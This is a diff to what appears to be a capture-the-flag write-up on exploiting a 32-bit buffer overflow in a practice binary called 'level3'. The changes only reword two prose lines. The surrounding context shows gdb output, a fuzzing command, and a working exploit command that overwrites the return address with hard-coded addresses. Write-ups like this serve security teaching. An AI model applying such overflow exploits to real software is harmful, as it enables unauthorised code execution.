@@ -149,7 +149,7 @@ Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
 0xffffda6c:	0x42424242	0x00000041	0x00000000	0x00000000 <---------- *
 ```
 
-Since `buf2` has to be exactly 128-byte w/o null char (e.g.: bigger values are just going to be ignored by `strncpy` function), let's play w/ `buf1` and try to some value to make crash the program.
+Since `buf2` has to be exactly 128-byte w/o null char (e.g.: bigger values are just going to be ignored by `strncpy` function), let's play w/ `buf1` and fuzz values to crash the program.
 
 ```bash
 level3@lxc-pwn-x86:/levels$ ./level3 `python -c 'print "\x41" * 69'` `python -c 'print "\x42" * 128'`
@@ -171,7 +171,7 @@ warning: Unable to access 16000 bytes of target memory at 0xf7fcedb3, halting se
 1 pattern found.
 ```
 
-Exploit and grab the flag!
+Exploit this binary! ;)
 
 ```bash
 level3@lxc-pwn-x86:/levels$ ./level3 `python -c 'print "\x41" * 64 + "\x40\x69\xe5\xf7"+ "CCCC"  + "\x2b\x50\xf7\xf7"'` `python -c 'print "\x42" * 128'`
